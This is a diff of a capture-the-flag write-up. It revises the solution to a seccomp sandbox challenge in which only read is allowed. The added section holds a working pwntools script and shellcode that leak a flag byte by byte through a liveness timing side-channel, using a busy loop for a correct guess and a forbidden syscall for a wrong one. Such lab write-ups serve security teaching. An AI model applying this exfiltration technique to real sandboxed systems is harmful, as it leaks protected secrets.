@@ -58,50 +58,80 @@ int main(int argc, char **argv, char **envp)
 }
 ```
 
-= Timing side-channel via Busy Loop
-
-== Introduction
-
-This challenge represents the most restrictive sandbox in the series. Only the `read` system call is permitted. All other syscalls, including `exit` and `nanosleep`, are blocked. Traditional side-channels like exit codes or deliberate sleeping are unavailable.
-
 == Vulnerability Analysis
 
-A file descriptor to the flag (FD 3) is opened before the seccomp filter is applied. While we can read the flag into memory, we cannot use any system call to communicate its content back to user-space.
+This level is even more restrictive than the nanosleep challenge. Only `read` is allowed. Every other syscall is blocked and kills the process.
 
-However, we can still use CPU execution time as a side-channel. By either hanging the process or letting it be killed immediately, we can leak information.
+This means we cannot even use `nanosleep` to create a delay. However, we can create a delay using CPU instructions. An infinite loop (or a very long loop) keeps the process alive, while any forbidden syscall kills it instantly.
 
-== Exploitation Steps
+This difference in "life expectancy" (alive vs. dead) is our side-channel.
 
-=== 1. Reading the Flag
-The shellcode reads the flag from the pre-opened file descriptor.
+== Exploitation Plan
 
-```nasm
-/* read(3, buf, 100) */
-mov rdi, 3
-mov rsi, buf_addr
-mov rdx, 100
-mov rax, 0
-syscall
+1.  **Read Flag:** Read the flag from the pre-opened FD 3.
+2.  **Compare Byte:** Check if `flag[i] == guess`.
+3.  **Busy Loop:**
+    *   If correct: Enter an infinite loop (`jmp $`).
+    *   If wrong: Trigger a forbidden syscall (e.g., `write`).
+4.  **Measure Time:** The python script waits for a short period (e.g., 0.5s) and checks if the process is still running. If it is, the guess was correct.
+
+== Exploit Script
+
+```python
+from pwn import *
+import time
+
+exe = "./challenge"
+context.binary = exe
+
+flag = ""
+index = 0
+
+while True:
+    found = False
+    for char_code in range(32, 127):
+        shellcode = asm(f"""
+            /* read(3, stack, 100) */
+            mov rdi, 3
+            mov rsi, rsp
+            mov rdx, 100
+            mov rax, 0
+            syscall
+
+            /* Compare buffer[index] with guess */
+            movzx rax, byte ptr [rsp + {index}]
+            cmp rax, {char_code}
+            je busy_loop
+
+            /* Kill immediately if wrong (forbidden syscall) */
+            mov rax, 60
+            syscall
+
+        busy_loop:
+            jmp busy_loop
+        """)
+
+        # Run process
+        p = process([exe, "/flag"], level='error')
+        p.send(shellcode)
+        
+        # Allow it to run for a bit
+        time.sleep(0.5)
+        
+        # Check if it's still alive
+        if p.poll() is None:
+            # Alive! Correct guess.
+            flag += chr(char_code)
+            print(f"Found: {chr(char_code)} | Flag: {flag}")
+            found = True
+            p.kill()
+            p.close()
+            break
+        
+        p.close()
+    
+    if not found:
+        print("End of flag or char not found.")
+        break
+    index += 1
 ```
-
-=== 2. CPU Timing Side-Channel
-We compare a specific byte of the flag with a guess. If the guess is correct, the shellcode enters an infinite busy loop (`jmp $`). If the guess is incorrect, the shellcode executes a forbidden syscall (e.g., `write`), which causes seccomp to kill the process immediately.
-
-```nasm
-/* if buf[index] == guess: busy_loop */
-movzx rax, byte ptr [buf_addr + index]
-cmp rax, guess
-je busy_loop
-
-/* forbidden syscall to kill process */
-mov rax, 1
-syscall
-
-busy_loop:
-jmp busy_loop
-```
-
-=== 3. Automated Reconstruction
-A python script iterates through each character position and possible values. It measures how long the process stays alive after the shellcode starts. If the process is still running after a significant delay (e.g., 1 second), it indicates a correct guess. The script then kills the hanging process and moves to the next byte.
-
-The retrieved flag was: `falg\n`.
